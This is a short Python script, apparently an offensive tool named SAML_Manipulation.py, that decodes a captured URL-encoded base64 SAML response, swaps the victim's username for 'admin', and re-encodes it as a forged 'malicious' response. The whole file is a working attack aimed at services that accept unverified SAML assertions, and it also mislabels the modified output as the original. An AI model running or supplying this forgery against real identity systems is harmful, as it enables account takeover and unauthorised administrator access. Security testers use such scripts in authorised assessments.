#!/usr/bin/python3

import sys
from base64 import b64decode, b64encode
import urllib.parse
bn=""
bn +="                            _      ___  _   \n"
bn +=" _ __ ___   ___  __ _  __ _| |__  / _ \| |_ \n"
bn +="| '_ ` _ \ / _ \/ _` |/ _` | '_ \| | | | __|\n"
bn +="| | | | | |  __/ (_| | (_| | |_) | |_| | |_ \n"
bn +="|_| |_| |_|\___|\__, |\__,_|_.__/ \___/ \__|\n"
bn +="                |___/                       \n"
print(bn)


if len(sys.argv) != 3:
        print("ERROR!!!")
        print(" [+] Usage: ./SAML_Manipulation.py <username> <token>")
        print(" [+] test@gmail.com --> Test is username") 
else:
        username = sys.argv[1]
        stri = urllib.parse.unquote( sys.argv[2])
        response = b64decode(stri)
        decoded= str(response.decode('utf-8'))
        mal_response = decoded.replace(username, "admin")
        print(" [+] Orignal XML Response:")
        print(mal_response)
        print(" [+] Malcious XML response, encoded:")
        print(urllib.parse.quote(b64encode(mal_response.encode('utf-8'))))
